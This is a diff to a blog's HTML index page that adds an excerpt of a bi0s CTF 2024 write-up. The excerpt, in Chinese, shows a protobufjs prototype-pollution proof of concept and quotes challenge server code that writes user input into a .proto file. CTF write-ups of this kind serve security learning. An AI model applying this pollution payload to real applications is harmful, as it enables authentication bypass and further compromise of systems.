@@ -152,6 +152,21 @@
 
 <article class="post-entry"> 
   <header class="entry-header">
+    <h2 class="entry-hint-parent">bi0s CTF 2024 wp
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>required note 用npm audit搜索历史漏洞。发现一个原型链污染的漏洞。 POC:
+const protobuf = require(&#34;protobufjs&#34;); protobuf.parse(&#39;option(a).constructor.prototype.verified = true;&#39;); console.log({}.verified); // returns true /create会进行protojs解析。
+app.post(&#39;/create&#39;, (req, res) =&gt; { requestBody=req.body try{ schema = fs.readFileSync(&#39;./settings.proto&#39;, &#39;utf-8&#39;); root = protobuf.parse(schema).root; Note = root.lookupType(&#39;Note&#39;); [...] 在/customise可以修改settings.proto文件。
+app.post(&#39;/customise&#39;,(req, res) =&gt; { try { const { data } = req.body; let author = data.pop()[&#39;author&#39;]; let title = data.pop()[&#39;title&#39;]; let protoContents = fs.readFileSync(&#39;./settings.proto&#39;, &#39;utf-8&#39;).split(&#39;\n&#39;); if (author) { protoContents[5] = ` ${author} string author = 3 [default=&#34;user&#34;];`; } if (title) { protoContents[3] = ` ${title} string title = 1 [default=&#34;user&#34;];`; } fs....</p>
+  </div>
+  <footer class="entry-footer"><span title='2024-02-27 15:33:01 +0000 UTC'>February 27, 2024</span>&nbsp;·&nbsp;3 min</footer>
+  <a class="entry-link" aria-label="post link to bi0s CTF 2024 wp" href="https://zoiltin.github.io/posts/bi0s-ctf-2024-wp/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
     <h2 class="entry-hint-parent">movectf_2024_wp
     </h2>
   </header>
